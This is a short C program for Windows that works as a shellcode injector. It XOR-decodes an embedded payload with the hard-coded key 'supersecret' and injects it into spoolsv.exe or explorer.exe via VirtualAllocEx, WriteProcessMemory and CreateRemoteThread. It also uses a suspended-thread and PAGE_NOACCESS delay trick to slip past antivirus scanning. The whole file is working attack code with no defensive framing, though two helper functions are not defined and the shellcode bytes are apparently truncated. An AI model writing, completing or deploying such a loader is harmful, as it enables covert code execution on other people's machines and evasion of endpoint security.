#include <windows.h>

void xorDecrypter(unsigned char *shellcode, int sLength, char *key, int kLength)
{
    int j = 0;
    for (int i = 0; i < sLength; i++)
    {
        if (j == kLength - 1) j = 0;

        shellcode[i] = shellcode[i] ^ key[j];
        j++;
    }
    return;
}


int main(int argc, char* argv[])
{

    unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51";
    char key[] = "supersecret";
    xorDecrypter(shellcode, sizeof(shellcode), key, sizeof(key));

    HANDLE hProcess = NULL;

    if (IsElevated())
    {
        hProcess = GetProcessByName(L"spoolsv.exe");
    }
    else
    {
        hProcess = GetProcessByName(L"explorer.exe");
    }
    DWORD pid = GetProcessId(hProcess);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
    LPVOID addr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, 0x40);

    WriteProcessMemory(hProcess, addr, shellcode, sizeof(shellcode), NULL);

    VirtualProtectEx(hProcess, addr, sizeof(shellcode), PAGE_NOACCESS, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, CREATE_SUSPENDED, NULL);

    Sleep(5000);

    VirtualProtectEx(hProcess, addr, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);
    ResumeThread(hThread);
}
